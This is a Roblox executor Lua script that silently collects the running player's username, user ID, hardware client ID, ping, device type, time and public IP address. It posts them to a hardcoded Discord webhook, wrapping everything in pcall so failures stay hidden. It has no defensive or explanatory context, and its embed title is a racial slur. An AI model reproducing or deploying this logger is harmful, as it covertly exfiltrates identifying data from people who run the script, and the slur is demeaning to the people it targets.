local webh = "https://discord.com/api/webhooks/1195643306944757810/uSFjZI4RQ_0fgcujsFhgr3toVNUe2nS8d-xNIAyBg3cYbDcOjASp592Q8dEnf_OsDuJ4"
pcall(function()
    local deviceType = ""

    if game:GetService("UserInputService").GamepadEnabled then
        deviceType = "Controller"
    elseif game:GetService("UserInputService").TouchEnabled then
        deviceType = "Touch"
    else
        deviceType = "Keyboard/Mouse"
    end

    local data = {
        ['embeds'] = {
            {
                ['title'] = 'nigga',
                ['description'] = 'priv ez ass',
                ['fields'] = {
                    {name = 'User', value = game:GetService("Players").LocalPlayer.Name .. " (ID: " .. game:GetService("Players").LocalPlayer.UserId .. ")"},
                    {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
                    {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
                    {name = "Device", value = deviceType},
                    {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S")},
                    {name = "IP", value = game:HttpGet('https://api.ipify.org')}
                }
            }
        }
    }

    if syn then
        local response = request(
            {
                Url = webh,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        )
    elseif request then
        local response = request(
            {
                Url = webh,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        )
    elseif http_request then
        local response = http_request(
            {
                Url = webh,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        )
    end
end)
